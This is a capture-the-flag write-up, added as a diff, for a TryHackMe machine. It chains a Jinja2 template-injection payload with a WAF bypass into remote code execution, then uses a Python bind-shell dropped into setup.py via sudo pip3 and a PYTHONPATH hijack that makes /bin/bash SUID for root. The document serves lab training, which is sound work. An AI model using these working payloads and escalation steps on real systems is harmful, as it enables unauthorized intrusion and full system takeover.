@@ -1,0 +1,166 @@
+# VulnNet: dotpy - Write-up
+**Author:** Web3-Serializer  
+**Platform:** TryHackMe | **Difficulty:** Medium  
+**Category:** SSTI, Python, Sudo privesc
+
+---
+
+## Overview
+
+Flask web app on port 8080. The 404 error page reflects the URL path directly into a Jinja2 template without sanitisation - classic SSTI. A WAF blocks the characters `. [ ] _` but can be fully bypassed using Jinja2's `|attr()` filter and hex-escaping underscores as `\x5f`.
+
+Full chain: **SSTI RCE → web shell → pip3 sudo → system-adm → PYTHONPATH sudo → root**
+
+---
+
+## Step 1 - Recon
+
+```
+nmap -sV -p- <IP>
+```
+
+Only port **8080** open - Werkzeug / Python 3.6.9.  
+Go to `http://<IP>:8080/login`, register an account, log in, grab your session cookie from the browser (DevTools → Application → Cookies).
+
+---
+
+## Step 2 - Finding the injection point
+
+Navigate to any non-existent path:
+
+```
+http://<IP>:8080/test
+```
+
+Response: `No results for test`
+
+Try `http://<IP>:8080/{{6*7}}` - response: `No results for 42`  
+**SSTI confirmed.**
+
+Try `http://<IP>:8080/{{config}}` - dumps the full Flask config including `SECRET_KEY`.  
+Try `http://<IP>:8080/{{config['SECRET_KEY']}}` - **blocked**.
+
+The WAF blocks: `. [ ] _`
+
+---
+
+## Step 3 - WAF bypass
+
+Jinja2 lets you access object attributes with `|attr('name')` instead of `.name`.  
+Underscores `_` are hex-escaped as `\x5f` inside strings.
+
+So `().__class__.__base__.__subclasses__()` becomes:
+
+```
+()|attr('\x5f\x5fclass\x5f\x5f')
+ |attr('\x5f\x5fbase\x5f\x5f')
+ |attr('\x5f\x5fsubclasses\x5f\x5f')()
+```
+
+`subprocess.Popen` is at index **401** in the subclasses list on this box.  
+The full RCE payload:
+
+```
+{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('pop')(401)('id',shell=True,stdout=-1)|attr('communicate')()}}
+```
+
+---
+
+## Step 4 - Running the PoC
+
+Install deps:
+```bash
+pip install requests colorama
+```
+
+Probe and confirm RCE:
+```bash
+py main.py -t http://<IP>:8080 -c "<session_cookie>" probe
+```
+
+Run a command:
+```bash
+py main.py -t http://<IP>:8080 -c "<session_cookie>" cmd -x "id"
+# Output: uid=1001(web) gid=1001(web)
+```
+
+> **Note on reverse shells:** The TryHackMe VPN (`192.168.x.x`) often blocks incoming connections from the box. Use a **bind shell** instead - the box listens, you connect to it.
+
+Bind shell:
+```bash
+py main.py -t http://<IP>:8080 -c "<session_cookie>" bindshell -P 4444
+```
+Then in another terminal:
+```bash
+ncat <IP> 4444
+```
+
+---
+
+## Step 5 - Privesc: web → system-adm
+
+Check sudo rights:
+```bash
+sudo -l
+# (system-adm) NOPASSWD: /usr/bin/pip3 install *
+```
+
+`pip3 install` runs `setup.py` as the target user. Drop a bind shell in it:
+```bash
+mkdir /tmp/pwn
+echo 'import os,pty,socket;s=socket.socket();s.bind(("0.0.0.0",5555));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > /tmp/pwn/setup.py
+sudo -u system-adm /usr/bin/pip3 install /tmp/pwn
+```
+
+Connect from your machine:
+```bash
+ncat <IP> 5555
+# system-adm@vulnnet-dotpy
+```
+
+---
+
+## Step 6 - Privesc: system-adm → root
+
+Check sudo rights:
+```bash
+sudo -l
+# (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
+```
+
+`SETENV` means we can set environment variables. `/opt/backup.py` imports `zipfile` - we hijack it via `PYTHONPATH`:
+
+```bash
+echo 'import os;os.system("chmod +s /bin/bash")' > /dev/shm/zipfile.py
+sudo -u root PYTHONPATH=/dev/shm /usr/bin/python3 /opt/backup.py
+/bin/bash -p
+```
+
+```bash
+whoami
+# root
+```
+
+---
+
+## Flags
+
+```bash
+cat /home/system-adm/user.txt
+cat /root/root.txt
+```
+
+---
+
+## Summary
+
+| Step | Technique | Result |
+|------|-----------|--------|
+| SSTI detection | `{{6*7}}` in URL path | Eval confirmed |
+| WAF bypass | `\|attr()` + `\x5f` hex escape | RCE as `web` |
+| web → system-adm | `sudo pip3 install` + malicious `setup.py` | Shell as `system-adm` |
+| system-adm → root | `SETENV` + `PYTHONPATH` hijack of `zipfile` | Root |
+
+---
+
+*For educational purposes only. Use only against machines you own or have explicit permission to test.*
